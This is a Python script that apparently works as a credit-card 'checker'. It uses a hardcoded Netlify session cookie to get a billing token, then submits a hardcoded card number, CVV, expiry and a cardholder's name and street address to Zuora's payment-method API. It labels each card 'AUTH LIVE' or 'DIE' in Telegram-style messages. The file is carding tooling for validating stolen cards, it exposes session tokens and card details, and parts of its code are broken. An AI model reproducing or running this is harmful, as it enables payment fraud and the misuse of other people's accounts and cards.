import os
import requests, json
import time
import string
import random
import asyncio
from bs4 import BeautifulSoup
from datetime import datetime
import pytz

def braintree_auth():
  cc = 5302370501046305
  month = int("05")
  year = 2028
  ccv = 139
  try:
    first = 'Cathy'
    last ='Cathy'
    street = '1576 S White Station Rd'
    city = 'Memphis'
    state = 'Tennessee'
    postcode = '38117'
    data_1 = {}
    headers_1 = {
      'accept': '*/*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9',
      'content-length': '0',
      'content-type': 'application/json',
      'origin': 'https://app.netlify.com',
      'referer': 'https://app.netlify.com/teams/hichilyn4/billing/general',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
      'cookie': '_gcl_au=1.1.336042288.1669474725; _current_page=www.netlify.com/; _lead_source=Marketing Unknown; _initial_referrer=(Direct); _initial_landing_page=https://www.netlify.com/; _ga=GA1.2.2075412487.1669474725; ajs_anonymous_id=430f9972-440c-4cd9-9074-c8911bd8d1a7; hubspotutk=e46e47e549886cb8a988e4219cd74fee; _previous_page=www.netlify.com/; _recent_lead_source=Organic Search; _hjSessionUser_3123140=eyJpZCI6ImFjYjczYTkyLWY3N2YtNTViMS04OWNmLTA0MjM3YTUxMTU4ZCIsImNyZWF0ZWQiOjE2Njk0NzQ3MjUxNDksImV4aXN0aW5nIjp0cnVlfQ==; __ssid=3318772506e2a5633805ac96c526536; _gid=GA1.2.63071752.1672657596; __hstc=7523757.e46e47e549886cb8a988e4219cd74fee.1669474727585.1671341994122.1672657596754.3; __hssrc=1; amp_cebfd0=XWnnxd07LXWrYPn_qb0w5I...1glp2iql8.1glp2kbtv.0.0.0; __hssc=7523757.2.1672657596754; _nf-auth=eoeq8JB00C2Nsuiw4ieazpry76IuOc1geNHB_Ds2CTc; _nf-auth-hint=user-is-likely-authed; ajs_user_id=63b2baeedadcbd518d941561; _bitballoon_session=K7XceQrIl4tK6QdX2OJIA5XhsOqBREvlOJYGYdUwQZrM%2Fs4ReaOi8SUmw3wZdjMngIKpabE%2BYrpOELrHpOU%2B%2BXP4DfeiR0sgM9%2BzubZkxCrmrhrSZpc9Nf6db5ZHfTOKq7Rm8s9XGQTh3g1AwpR4Z0KufeYtHrsTXeFZllFMpNPJmOhvT6RLf0VZZQ%3D%3D--9aUyngL0slvZgc1e--bW6PaQZwCjQ9HyDM396mMQ%3D%3D; _dc_gtm_UA-42258181-4=1; _dd_s=rum=1&id=fc5edbf5-ffa8-4c10-bca5-c1abc34a79ef&created=1672657595058&expire=1672658689373'
    }
    req_1 = requests.post('https://app.netlify.com/access-control/bb-api/api/v1/billing/client_token?sandbox=0&legacy=0&account_id=63b2baeedadcbd518d941562', json=data_1, headers=headers_1).json()
    token = req_1['token']
    signature = req_1['signature']
    payment_gateway_id = req_1['payment_gateway_id']
    print(token)
    print(signature)
    print(payment_gateway_id)
    month = str(int(month))
    if cc[0] == '4':
      type = 'Visa'
    elif cc[0] == '5':
      type = 'MasterCard'
    data_2 = {
      "accountKey": payment_gateway_id,
      "cardHolderInfo": {
        "cardHolderName": f'{first} {last}',
        "addressLine1": street,
        "addressLine2": "",
        "city": city,
        "country": "US",
        "state": state,
        "zipCode": postcode
      },
      "creditCardNumber": cc,
      "creditCardType": type,
      "defaultPaymentMethod": 'true',
      "expirationMonth": month,
      "expirationYear": year,
      "securityCode": ccv,
    }
    headers_2 = {
      'Accept': 'application/json',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'vi-VN,vi;q=0.9',
      'Connection': 'keep-alive',
      'Content-Type': 'application/json',
      'Host': 'rest.zuora.com',
      'Origin': 'https://app.netlify.com',
      'Referer': 'https://app.netlify.com/teams/hichilyn4/billing/general',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'cross-site',
      'signature': signature,
      'token': token,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
    }
    req_2 = requests.post('https://rest.zuora.com/v1/payment-methods/credit-cards', json= data_2, headers= headers_2).json()
    print("done")
    print(req_2)
    if "True" in str(req_2) or 'Gateway Rejected: avs' in str(req_2):
      print(f'''✅ <b>BRAINTREE AUTH LIVE</b> ✅
<b>Card</b>: <code></code>
<b>Message</b>: Set up the payment method successfully.''')
    else:
      for x in req_2['reasons']:
        error = x['message']+'@'
      error = filter(str(error), '- ', '@')
      print(f'''❌ <b>BRAINTREE AUTH DIE</b> ❌
<b>Card</b>: <code></code>
<b>Message</b>: Transaction declined. [{error}]''')
  except:
    print(f'''⚠️ <b>BRAINTREE AUTH WARNING</b> ⚠️
<b>Card</b>: <code></code>
<b>Message</b>: Error occured.''')
braintree_auth()